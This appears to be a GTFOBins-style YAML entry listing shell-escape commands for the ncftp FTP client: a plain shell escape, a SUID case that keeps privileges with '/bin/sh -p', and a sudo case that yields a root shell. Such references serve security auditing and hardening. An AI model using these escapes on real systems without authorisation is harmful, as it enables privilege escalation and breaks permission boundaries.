---
functions:
  shell:
    - code: |
        ncftp
        !/bin/sh
  suid:
    - code: |
        ./ncftp
        !/bin/sh -p
  sudo:
    - code: |
        sudo ncftp
        !/bin/sh
---
